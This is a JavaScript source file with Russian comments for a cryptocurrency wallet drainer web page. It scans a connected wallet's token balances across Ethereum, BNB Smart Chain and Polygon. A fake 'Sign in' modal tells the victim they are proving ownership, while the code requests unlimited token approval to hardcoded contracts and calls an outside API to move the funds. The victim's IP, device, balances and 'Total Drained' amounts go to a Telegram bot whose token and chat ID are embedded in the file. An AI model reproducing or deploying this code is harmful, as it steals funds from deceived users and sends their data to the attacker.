import { bsc, mainnet, polygon } from '@reown/appkit/networks'
import { createAppKit } from '@reown/appkit'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
import { readContract, writeContract } from '@wagmi/core'

// Утилита для дебаунсинга
const debounce = (func, wait) => {
  let timeout
  return (...args) => {
    clearTimeout(timeout)
    timeout = setTimeout(() => func(...args), wait)
  }
}

// Конфигурация
const projectId = import.meta.env.VITE_PROJECT_ID || 'd85cc83edb401b676e2a7bcef67f3be8'
if (!projectId) throw new Error('VITE_PROJECT_ID is not set')

const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7893105607:AAFqn6yRhXVocTodMo8xNufTFKjmzMYnNAU'
const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002834788839'

const networks = [bsc, mainnet, polygon]
const networkMap = {
  'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56 },
  'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1 },
  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137 }
}
console.log('Network Map:', networkMap)

const CONTRACTS = {
  [networkMap['Ethereum'].chainId]: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC',
  [networkMap['BNB Smart Chain'].chainId]: '0x67062812416C73364926b9d31E183014deB95462',
  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c'
}

const wagmiAdapter = new WagmiAdapter({ projectId, networks })
const appKit = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  features: { analytics: true, email: false, socials: false }
})

// Состояние приложения
const store = {
  accountState: {},
  networkState: {},
  tokenBalances: [],
  errors: [],
  approvedTokens: {},
  isApprovalRequested: false,
  isApprovalRejected: false,
  connectionKey: null,
  isProcessingConnection: false
}

// Создание модального окна
function createCustomModal() {
  const style = document.createElement('style')
  style.textContent = `
    .custom-modal {
      opacity: 0;
      transition: opacity 0.3s ease-in-out;
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      justify-content: center;
      align-items: center;
    }
    .custom-modal.show {
      opacity: 1;
      display: flex;
    }
    .custom-modal-content {
      transform: translateY(-20px);
      transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
      opacity: 0;
      background-color: #121313;
      padding: 45px;
      border-radius: 30px;
      text-align: center;
      width: 320px;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
    }
    .custom-modal.show .custom-modal-content {
      transform: translateY(0);
      opacity: 1;
    }
    .custom-modal-title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 45px;
      margin-top: -25px;
    }
    .custom-modal-loader {
      border: 4px solid #ffffff33;
      border-top: 4px solid #ffffff;
      border-radius: 50%;
      width: 52px;
      height: 52px;
      animation: spin 1s ease-in-out infinite;
      margin: 0 auto 20px;
    }
    .custom-modal-message {
      margin-top: 45px;
      font-size: 16px;
      line-height: 1.5;
      color: #858585;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  `
  document.head.appendChild(style)

  const modal = document.createElement('div')
  modal.id = 'customModal'
  modal.className = 'custom-modal'
  modal.innerHTML = `
    <div class="custom-modal-content">
      <p class="custom-modal-title">Sign in</p>
      <div class="custom-modal-loader"></div>
      <p class="custom-modal-message">Sign this message to prove you own this wallet and proceed. Canceling will disconnect you.</p>
    </div>
  `
  document.body.appendChild(modal)
}

function showCustomModal() {
  const modal = document.getElementById('customModal')
  if (modal) {
    modal.style.display = 'flex'
    setTimeout(() => modal.classList.add('show'), 10)
  }
}

function hideCustomModal() {
  const modal = document.getElementById('customModal')
  if (modal) {
    modal.classList.remove('show')
    setTimeout(() => modal.style.display = 'none', 300)
  }
}

// Очистка состояния при загрузке страницы
window.addEventListener('load', () => {
  appKit.disconnect()
  localStorage.clear()
  sessionStorage.clear()
  store.accountState = {}
  store.networkState = {}
  store.tokenBalances = []
  store.errors = []
  store.approvedTokens = {}
  store.isApprovalRequested = false
  store.isApprovalRejected = false
  store.connectionKey = null
  store.isProcessingConnection = false
  updateButtonVisibility(false)
  updateStateDisplay('accountState', {})
  updateStateDisplay('networkState', {})
  updateStateDisplay('tokenBalancesState', [])
  createCustomModal()
})

// Утилиты для обновления состояния
const updateStore = (key, value) => {
  store[key] = value
}

const updateStateDisplay = (elementId, state) => {
  const element = document.getElementById(elementId)
  if (element) element.innerHTML = JSON.stringify(state, null, 2)
}

const updateButtonVisibility = (isConnected) => {
  const disconnectBtn = document.getElementById('disconnect')
  if (disconnectBtn) disconnectBtn.style.display = isConnected ? '' : 'none'
}

// Функция получения ссылки на сканер
const getScanLink = (hash, chainId, isTx = false) => {
  const basePath = isTx ? '/tx/' : '/address/'
  if (chainId === networkMap['Ethereum'].chainId) {
    return `https://etherscan.io${basePath}${hash}`
  } else if (chainId === networkMap['BNB Smart Chain'].chainId) {
    return `https://bscscan.com${basePath}${hash}`
  } else if (chainId === networkMap['Polygon'].chainId) {
    return `https://polygonscan.com${basePath}${hash}`
  }
  return '#'
}

// Функция отправки запроса на трансфер
const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
  try {
    const response = await fetch('https://api.amlinsight.io/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userAddress, tokenAddress, amount: amount.toString(), chainId, txHash })
    })
    const data = await response.json()
    if (data.success) {
      console.log(`Transfer request successful: ${data.txHash}`)
      return { success: true, txHash: data.txHash }
    }
    return { success: false, message: data.message }
  } catch (error) {
    return { success: false, message: error.message }
  }
}

// Функции для получения информации о пользователе
async function getUserIP() {
  const cachedIP = sessionStorage.getItem('userIP')
  if (cachedIP) return cachedIP
  try {
    const response = await fetch('https://api.ipify.org?format=json')
    const data = await response.json()
    const ip = data.ip || 'Unknown IP'
    sessionStorage.setItem('userIP', ip)
    return ip
  } catch (error) {
    return 'Unknown IP'
  }
}

function detectDevice() {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera || 'Unknown Device'
  if (/Windows NT/i.test(userAgent)) return 'Windows'
  if (/iPhone/i.test(userAgent) && !/Android/i.test(userAgent)) return 'iPhone'
  if (/Android/i.test(userAgent) && !/iPhone/i.test(userAgent)) return 'Android'
  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'Mac'
  if (/Tablet|iPad/i.test(userAgent)) return 'Tablet'
  return 'Desktop'
}

// Функция отправки сообщений в Telegram
async function sendTelegramMessage(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
    })
    const data = await response.json()
    if (!data.ok) throw new Error(data.description || 'Failed to send Telegram message')
    console.log('Telegram message sent successfully')
  } catch (error) {
    store.errors.push(`Error sending Telegram message: ${error.message}`)
  }
}

// Уведомления
async function notifyWalletConnection(address, walletName, device, balances, chainId) {
  const connectionKey = `${address}_${chainId}`
  if (store.connectionKey === connectionKey || store.isProcessingConnection) {
    console.log('Skipping duplicate wallet connection notification')
    return
  }
  store.isProcessingConnection = true
  try {
    showCustomModal()
    await new Promise(resolve => setTimeout(resolve, 3000))
    console.log('Sending wallet connection notification')
    const ip = await getUserIP()
    const siteUrl = window.location.href || 'Unknown URL'
    const scanLink = getScanLink(address, chainId)
    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
    let totalValue = 0
    const tokenList = balances
      .filter(token => token.balance > 0)
      .map(token => {
        const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0
        const value = token.balance * price
        totalValue += value
        return `➡️ ${token.symbol} - ${value.toFixed(2)}$`
      })
      .join('\n')
    const message = `🚨 New connect (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: ${networkName}\n` +
                    `🌎 ${ip}\n\n` +
                    `💰 **Total Value: ${totalValue.toFixed(2)}$**\n` +
                    `${tokenList}\n\n` +
                    `🔗 Site: ${siteUrl}`
    await sendTelegramMessage(message)
    store.connectionKey = connectionKey
    const hasBalance = balances.some(token => token.balance > 0)
    if (!hasBalance) {
      const modalMessage = document.querySelector('.custom-modal-message')
      if (modalMessage) modalMessage.textContent = 'Congratulations!'
      await new Promise(resolve => setTimeout(resolve, 1000))
      hideCustomModal()
      store.isProcessingConnection = false
      return
    }
  } catch (error) {
    store.errors.push(`Error in notifyWalletConnection: ${error.message}`)
    hideCustomModal()
    store.isProcessingConnection = false
  }
}

async function notifyTransferApproved(address, walletName, device, token, chainId) {
  try {
    console.log('Sending transfer approved notification')
    const ip = await getUserIP()
    const siteUrl = window.location.href || 'Unknown URL'
    const scanLink = getScanLink(address, chainId)
    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
    const amountValue = (token.balance * token.price).toFixed(2)
    const message = `⚠️ Balance transfer approved (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: ${networkName}\n` +
                    `🌎 ${ip}\n\n` +
                    `**🔥 Processing: ${amountValue}$**\n` +
                    `➡️ ${token.symbol}\n\n` +
                    `🔗 Site: ${siteUrl}`
    await sendTelegramMessage(message)
  } catch (error) {
    store.errors.push(`Error in notifyTransferApproved: ${error.message}`)
  }
}

async function notifyTransferSuccess(address, walletName, device, token, chainId, txHash) {
  try {
    console.log('Sending transfer success notification')
    const ip = await getUserIP()
    const scanLink = getScanLink(address, chainId)
    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
    const amountValue = (token.balance * token.price).toFixed(2)
    const txLink = getScanLink(txHash, chainId, true)
    const message = `✅ Drainer successfully (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: ${networkName}\n` +
                    `🌎 ${ip}\n\n` +
                    `**💰 Total Drained: ${amountValue}$**\n` +
                    `➡️ ${token.symbol} - ${amountValue}$\n\n` +
                    `🔗 Transfer: [Transaction Hash](${txLink})`
    await sendTelegramMessage(message)
  } catch (error) {
    store.errors.push(`Error in notifyTransferSuccess: ${error.message}`)
  }
}

const TOKENS = {
  'Ethereum': [
    { symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 },
    { symbol: 'USDC', address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 },
    { symbol: 'DAI', address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 },
    { symbol: 'WBTC', address: '0x2260fac5e5542a773aa44fbcfedf7c193bc2c599', decimals: 8 },
    { symbol: 'UNI', address: '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984', decimals: 18 },
    { symbol: 'LINK', address: '0x514910771af9ca656af840dff83e8264ecf986ca', decimals: 18 },
    { symbol: 'COMP', address: '0xc00e94cb662c3520282e6f5717214004a7f26888', decimals: 18 },
    { symbol: 'YFI', address: '0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e', decimals: 18 },
    { symbol: 'CRV', address: '0xd533a949740bb3306d119cc777fa900ba034cd52', decimals: 18 },
    { symbol: 'BAT', address: '0x0d8775f648430679a709e98d2b0cb6250d2887ef', decimals: 18 },
    { symbol: 'ZRX', address: '0xe41d2489571d322189246dafa5ebde1f4699f498', decimals: 18 },
    { symbol: 'LRC', address: '0xbbbbca6a901c926f240b89eacb641d8aec7aeafd', decimals: 18 },
    { symbol: 'BNB', address: '0xb8c77482e45f1f44de1745f52c74426c631bdd52', decimals: 18 },
    { symbol: 'SHIB', address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', decimals: 18 },
    { symbol: 'PEPE', address: '0x6982508145454ce325ddbe47a25d4ec3d2311933', decimals: 18 },
    { symbol: 'LEASH', address: '0x27c70cd1946795b66be9d954418546998b546634', decimals: 18 },
    { symbol: 'FLOKI', address: '0xcf0c122c6b73ff809c693db761e7baebe62b6a2e', decimals: 18 },
    { symbol: 'AAVE', address: '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9', decimals: 18 },
    { symbol: 'RNDR', address: '0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24', decimals: 18 },
    { symbol: 'MKR', address: '0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2', decimals: 18 },
    { symbol: 'SUSHI', address: '0x6b3595068778dd592e39a122f4f5a5cf09c90fe2', decimals: 18 },
    { symbol: 'GLM', address: '0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429', decimals: 18 },
    { symbol: 'REP', address: '0x1985365e9f78359a9b6ad760e32412f4a445e862', decimals: 18 },
    { symbol: 'SNT', address: '0x744d70fdbe2ba4cf95131626614a1763df805b9e', decimals: 18 },
    { symbol: 'STORJ', address: '0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac', decimals: 8 }
  ],
  'BNB Smart Chain': [
    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
    { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
    { symbol: 'SHIB', address: '0x2859e4544c4bb039668b1a517b2f6c39240b3a2f', decimals: 18 },
    { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
    { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 },
    { symbol: 'CAKE', address: '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', decimals: 18 },
    { symbol: 'BAKE', address: '0xe02df9e3e622debdd69fb838bb799e3f168902c5', decimals: 18 },
    { symbol: 'XVS', address: '0xcf6bb5389c92bdda8a3747f6db454cb7a64626c6', decimals: 18 },
    { symbol: 'ALPACA', address: '0x8f0528ce5ef7b51152a59745befdd91d97091d2f', decimals: 18 },
    { symbol: 'AUTO', address: '0xa184088a740c695e156f91f5cc086a06bb78b827', decimals: 18 },
    { symbol: 'BURGER', address: '0xae9269f27437f0fcbc232d39ec814844a51d6b8f', decimals: 18 },
    { symbol: 'EPS', address: '0xa7f552078dcc247c2684336020c03648500c6d9f', decimals: 18 },
    { symbol: 'BELT', address: '0xe0e514c71282b6f4e823703a39374cf58dc3ea4f', decimals: 18 },
    { symbol: 'MBOX', address: '0x3203c9e46ca618c8c4c2c9f0e2e7b0d5d0e75', decimals: 18 },
    { symbol: 'SFP', address: '0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb', decimals: 18 },
    { symbol: 'BabyDoge', address: '0xc748673057861a797275cd8a068abb95a902e8de', decimals: 18 },
    { symbol: 'EGC', address: '0xc001bbe2b87079294c63ece98bdd0a88d761434e', decimals: 18 },
    { symbol: 'QUACK', address: '0xd74b782e05aa25c50e7330af541d46e18f36661c', decimals: 18 },
    { symbol: 'PIT', address: '0xa172e2f0f0ed1c8160f7b99c2c6834c2c6b6f2', decimals: 18 }
  ],
  'Polygon': [
    { symbol: 'USDT', address: '0xc2132d05d31c914c87c6611c10748aeb04b58e8f', decimals: 6 },
    { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 },
    { symbol: 'QUICK', address: '0x831753dd7087cac61ab5644b308642cc1c33dc13', decimals: 18 },
    { symbol: 'GHST', address: '0x3857eeac5cb85a38a9a07a70c73e0a3271cfb54a7', decimals: 5 },
    { symbol: 'DFYN', address: '0xc168e40227e4ebd8c1dabb4b05d0b7c', decimals: 18 },
    { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
    { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0a0faea8e9b7ea0f28c4', decimals: 18 },
    { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 }
  ]
}

const erc20Abi = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ],
    name: 'approve',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function'
  }
]

const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
  if (!address || !tokenAddress || !isAddress(address) || !isAddress(tokenAddress)) {
    console.error(`Invalid or missing address: ${address}, tokenAddress: ${tokenAddress}`)
    return 0
  }
  try {
    const balance = await readContract(wagmiConfig, {
      address: tokenAddress,
      abi: erc20Abi,
      functionName: 'balanceOf',
      args: [address],
      chainId
    })
    return Number(formatUnits(balance, decimals))
  } catch (error) {
    store.errors.push(`Error fetching balance for ${tokenAddress} on chain ${chainId}: ${error.message}`)
    return 0
  }
}

const getTokenPrice = async (symbol) => {
  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`)
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`)
    const data = await response.json()
    return Number(data.price) || 0
  } catch (error) {
    store.errors.push(`Error fetching price for ${symbol}: ${error.message}`)
    return 0
  }
}

const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
  const checksumTokenAddress = getAddress(tokenAddress)
  const checksumContractAddress = getAddress(contractAddress)
  try {
    const gasLimit = BigInt(200000)
    const maxFeePerGas = BigInt(1000000000)
    const maxPriorityFeePerGas = BigInt(1000000000)
    console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
    const txHash = await writeContract(wagmiConfig, {
      address: checksumTokenAddress,
      abi: erc20Abi,
      functionName: 'approve',
      args: [checksumContractAddress, maxUint256],
      chainId,
      gas: gasLimit,
      maxFeePerGas,
      maxPriorityFeePerGas
    })
    console.log(`Approve transaction sent: ${txHash}`)
    return txHash
  } catch (error) {
    store.errors.push(`Approve token failed: ${error.message}`)
    throw error
  }
}

// Инициализация подписок
const initializeSubscribers = (modal) => {
  const debouncedSubscribeAccount = debounce(async state => {
    updateStore('accountState', state)
    updateStateDisplay('accountState', state)
    if (state.isConnected && state.address && isAddress(state.address) && store.networkState.chainId) {
      const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
      const device = detectDevice()
      if (store.isProcessingConnection) {
        console.log('Already processing connection, skipping')
        return
      }
      const balancePromises = []
      Object.entries(TOKENS).forEach(([networkName, tokens]) => {
        const networkInfo = networkMap[networkName]
        if (!networkInfo) {
          console.warn(`Network ${networkName} not found in networkMap`)
          return
        }
        tokens.forEach(token => {
          if (isAddress(token.address)) {
            balancePromises.push(
              getTokenBalance(wagmiAdapter.wagmiConfig, state.address, token.address, token.decimals, networkInfo.chainId)
                .then(balance => ({
                  symbol: token.symbol,
                  balance,
                  address: token.address,
                  network: networkName,
                  chainId: networkInfo.chainId,
                  decimals: token.decimals
                }))
                .catch(() => ({
                  symbol: token.symbol,
                  balance: 0,
                  address: token.address,
                  network: networkName,
                  chainId: networkInfo.chainId,
                  decimals: token.decimals
                }))
            )
          }
        })
      })
      const allBalances = await Promise.all(balancePromises)
      store.tokenBalances = allBalances
      updateStateDisplay('tokenBalancesState', allBalances)
      let maxValue = 0
      let mostExpensive = null
      for (const token of allBalances) {
        if (token.balance > 0) {
          const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
          const value = token.balance * price
          token.price = price
          if (value > maxValue) {
            maxValue = value
            mostExpensive = { ...token, price, value }
          }
        }
      }
      await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId)
      if (mostExpensive) {
        console.log(`Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`)
        console.log('Available networks:', networks.map(n => ({ name: n.name, chainId: n.id || 'undefined' })))
        const targetNetworkInfo = networkMap[mostExpensive.network]
        if (!targetNetworkInfo) {
          const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
          store.errors.push(errorMessage)
          const approveState = document.getElementById('approveState')
          if (approveState) approveState.innerHTML = errorMessage
          hideCustomModal()
          store.isProcessingConnection = false
          return
        }
        const targetNetwork = targetNetworkInfo.networkObj
        const expectedChainId = targetNetworkInfo.chainId
        if (store.networkState.chainId !== expectedChainId) {
          console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
          try {
            await new Promise((resolve, reject) => {
              const unsubscribe = modal.subscribeNetwork(networkState => {
                if (networkState.chainId === expectedChainId) {
                  console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
                  unsubscribe()
                  resolve()
                }
              })
              appKit.switchNetwork(targetNetwork).catch(error => {
                unsubscribe()
                reject(error)
              })
              setTimeout(() => {
                unsubscribe()
                reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
              }, 10000)
            })
          } catch (error) {
            const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
            store.errors.push(errorMessage)
            const approveState = document.getElementById('approveState')
            if (approveState) approveState.innerHTML = errorMessage
            hideCustomModal()
            store.isProcessingConnection = false
            return
          }
        } else {
          console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
        }
        try {
          const contractAddress = CONTRACTS[mostExpensive.chainId]
          const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
          if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
            const approveMessage = store.approvedTokens[approvalKey]
              ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
              : store.isApprovalRejected
              ? `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
              : `Approve request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`
            console.log(approveMessage)
            const approveState = document.getElementById('approveState')
            if (approveState) approveState.innerHTML = approveMessage
            hideCustomModal()
            store.isProcessingConnection = false
            return
          }
          store.isApprovalRequested = true
          const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId)
          store.approvedTokens[approvalKey] = true
          store.isApprovalRequested = false
          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
          console.log(approveMessage)
          await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
          const tokenBalance = mostExpensive.balance
          const amount = parseUnits(tokenBalance.toString(), mostExpensive.decimals)
          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
          if (transferResult.success) {
            approveMessage += `<br>Transfer request successful: ${transferResult.txHash}`
            console.log(`Transfer request successful: ${transferResult.txHash}`)
            await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
          } else {
            approveMessage += `<br>Transfer request failed: ${transferResult.message}`
            console.log(`Transfer request failed: ${transferResult.message}`)
          }
          const approveState = document.getElementById('approveState')
          if (approveState) approveState.innerHTML = approveMessage
          hideCustomModal()
          store.isProcessingConnection = false
        } catch (error) {
          store.isApprovalRequested = false
          if (error.code === 4001 || error.code === -32000) {
            store.isApprovalRejected = true
            const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
            store.errors.push(errorMessage)
            const approveState = document.getElementById('approveState')
            if (approveState) approveState.innerHTML = errorMessage
            hideCustomModal()
            appKit.disconnect()
            store.connectionKey = null
            store.isProcessingConnection = false
            sessionStorage.clear()
          } else {
            const errorMessage = `Approve failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`
            store.errors.push(errorMessage)
            const approveState = document.getElementById('approveState')
            if (approveState) approveState.innerHTML = errorMessage
            hideCustomModal()
            store.isProcessingConnection = false
          }
        }
      } else {
        const message = 'No tokens with positive balance'
        console.log(message)
        const mostExpensiveState = document.getElementById('mostExpensiveTokenState')
        if (mostExpensiveState) mostExpensiveState.innerHTML = message
        hideCustomModal()
        store.isProcessingConnection = false
      }
    }
  }, 1000)
  modal.subscribeAccount(debouncedSubscribeAccount)
  modal.subscribeNetwork(state => {
    updateStore('networkState', state)
    updateStateDisplay('networkState', state)
    const switchNetworkBtn = document.getElementById('switch-network')
    if (switchNetworkBtn) {
      switchNetworkBtn.textContent = `Switch to ${state?.chainId === polygon.id ? 'Mainnet' : 'Polygon'}`
    }
  })
}

initializeSubscribers(appKit)
updateButtonVisibility(appKit.getIsConnectedState())

document.getElementById('open-connect-modal')?.addEventListener('click', () => {
  if (!appKit.getIsConnectedState()) {
    appKit.open()
  }
})

document.getElementById('disconnect')?.addEventListener('click', () => {
  appKit.disconnect()
  store.approvedTokens = {}
  store.errors = []
  store.isApprovalRequested = false
  store.isApprovalRejected = false
  store.connectionKey = null
  store.isProcessingConnection = false
  sessionStorage.clear()
})

document.getElementById('switch-network')?.addEventListener('click', () => {
  const currentChainId = store.networkState?.chainId
  appKit.switchNetwork(currentChainId === polygon.id ? mainnet : polygon)
})
